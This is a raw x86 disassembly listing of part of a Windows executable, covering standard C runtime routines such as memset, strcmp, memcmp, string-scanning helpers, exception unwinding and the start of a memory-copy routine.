  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
